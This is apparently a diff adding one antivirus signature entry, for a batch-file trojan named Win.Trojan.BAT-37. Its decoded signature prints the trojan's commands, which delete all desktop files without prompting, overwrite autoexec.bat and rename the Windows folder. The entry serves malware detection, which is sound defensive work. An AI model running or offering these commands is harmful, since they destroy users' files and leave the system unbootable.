@@ -1,0 +1,9 @@
+VIRUS NAME: Win.Trojan.BAT-37
+TARGET TYPE: ANY FILE
+OFFSET: *
+DECODED SIGNATURE:
+echo off
+@echo y | del c:\windows\desktop\*.*
+@echo c:\ > c:\autoexec.bat
+@echo cd\ >> c:\autoexec.bat
+@echo ren windows ≈indo≈s 
